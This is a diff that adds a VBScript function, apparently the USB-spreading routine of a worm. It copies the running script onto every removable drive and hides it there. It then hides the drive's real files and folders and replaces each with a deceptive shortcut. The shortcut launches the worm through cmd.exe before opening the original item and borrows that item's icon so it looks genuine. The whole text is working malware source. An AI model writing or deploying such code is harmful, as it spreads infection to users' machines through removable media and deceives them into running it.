@@ -1,0 +1,63 @@
+Function usb() 
+ on error resume next 
+ dim lnkobj 
+ dim filename 
+ dim foldername 
+ dim fileicon 
+ dim foldericon 
+ 
+ for each drive in filesystemobj.drives 
+ 
+ if  drive.isready = true then 
+  if  drive.freespace  > 0 then 
+   if  drive.drivetype  = 1 then 
+    filesystemobj.copyfile wscript.scriptfullname , drive.path & "\" & installname,true 
+    if  filesystemobj.fileexists (drive.path & "\" & installname)  then 
+     filesystemobj.getfile(drive.path & "\"  & installname).attributes = 2+4 
+    end if 
+    for each file in filesystemobj.getfolder( drive.path & "\" ).Files 
+    if not lnkfile then exit for 
+    if  instr (file.name,".") then 
+     if  lcase (split(file.name, ".") (ubound(split(file.name, ".")))) <> "lnk" then 
+      file.attributes = 2+4 
+      if  ucase (file.name) <> ucase (installname) then 
+       filename = split(file.name,".") 
+       set lnkobj = shellobj.createshortcut (drive.path & "\"  & filename (0) & ".lnk")  
+       lnkobj.windowstyle = 7 
+       lnkobj.targetpath = "cmd.exe" 
+       lnkobj.workingdirectory = "" 
+       lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start " & replace(file.name," ", chrw(34) & " " & chrw(34)) &"&exit" 
+       fileicon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\" & shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\." & split(file.name, ".")(ubound(split(file.name, ".")))& "\") & "\defaulticon\")  
+       if  instr (fileicon,",") = 0 then 
+        lnkobj.iconlocation = file.path 
+       else  
+        lnkobj.iconlocation = fileicon 
+       end if 
+      lnkobj.save() 
+     end if 
+    end if 
+    end if 
+    next 
+    for each folder in filesystemobj.getfolder( drive.path & "\" ).subfolders 
+    if not lnkfolder then exit for 
+    folder.attributes = 2+4 
+    foldername = folder.name 
+    set lnkobj = shellobj.createshortcut (drive.path & "\"  & foldername & ".lnk")  
+    lnkobj.windowstyle = 7 
+    lnkobj.targetpath = "cmd.exe" 
+    lnkobj.workingdirectory = "" 
+    lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start explorer " & replace(folder.name," ", chrw(34) & " " & chrw(34)) &"&exit" 
+    foldericon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\folder\defaulticon\")  
+    if  instr (foldericon,",") = 0 then 
+     lnkobj.iconlocation = folder.path 
+    else  
+     lnkobj.iconlocation = foldericon 
+    end if 
+    lnkobj.save() 
+    next 
+   end If 
+  end If 
+ end if 
+ next 
+ err.clear 
+End Function
